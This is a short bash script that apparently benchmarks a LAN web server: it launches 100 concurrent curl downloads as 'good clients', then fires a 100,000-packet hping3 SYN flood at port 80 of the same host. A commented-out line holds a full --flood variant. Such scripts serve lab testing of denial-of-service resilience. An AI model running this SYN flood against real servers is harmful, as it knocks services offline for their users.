#!/bin/bash

SERVER_ADDR=192.168.1.102
REQ_URL=$SERVER_ADDR/mid-100M.iso
NUM_THREADS=100
NUM_REQS=1

do_web_req () { curl -s --limit-rate 10M $REQ_URL > /dev/null; }
web_req_thread() { for i in $(seq $NUM_REQS); do do_web_req; done; }
start_good_clients () { for i in $(seq $NUM_THREADS); do web_req_thread& done; wait; }

#run_syn_flood () { hping3 --flood -S -p 80 -c 100000 $SERVER_ADDR; }
run_syn_flood () { hping3 -i u10 -S -p 80 -c 100000 -q $SERVER_ADDR; }

start_good_clients &
sleep 4.5
run_syn_flood &
sleep 1.1
sudo killall hping3

jobs

wait
